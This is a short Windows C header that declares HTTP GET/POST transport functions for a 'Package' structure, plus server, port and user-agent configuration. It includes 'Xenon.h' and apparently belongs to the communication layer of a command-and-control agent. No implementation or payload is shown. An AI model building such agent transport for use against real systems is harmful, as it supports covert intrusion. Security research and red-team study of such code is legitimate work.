#pragma once
#include <windows.h>

#include <wininet.h>

#include "Xenon.h"

#include "Parser.h"
#include "Package.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

extern BOOL gHttpIsInit;

// Localhost for little endian
#define LOCALHOST 0x0100007f

void HttpInit(void);

BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);

BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);

void HttpConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent);

void HttpClose(void);
